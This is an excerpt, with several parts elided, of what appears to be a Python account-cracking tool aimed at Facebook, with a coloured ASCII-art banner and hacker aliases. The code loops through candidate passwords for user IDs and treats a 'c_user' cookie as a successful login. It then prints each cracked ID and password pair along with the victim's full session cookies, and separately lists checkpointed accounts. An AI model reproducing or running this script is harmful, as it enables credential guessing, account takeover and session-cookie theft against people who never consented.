...
\033[1;92m ██╔██╗ ██║╚════██║██╔══██║██║╚██╗██║   \033[1;93m
\033[1;92m██╔╝ ██╗██║███████║██║  ██║██║ ╚████║     \033[1;93m
\033[1;92m╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚══AntoDark_FixNeT_67_HaXor  \033[1;93m
...
def i():
    ...
    os.system('clear')
    print(logo)
    print("             \033[1;97m[\033[1;33m Xisan  \033[1;97m]")
    print(" \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\033[38;5;46m[xisan -OK] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES : \033[38;5;46m'+coki+ ' ')                
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;196m[xisan -CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r  \33[1;93m[\033[1;95mXisan \033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
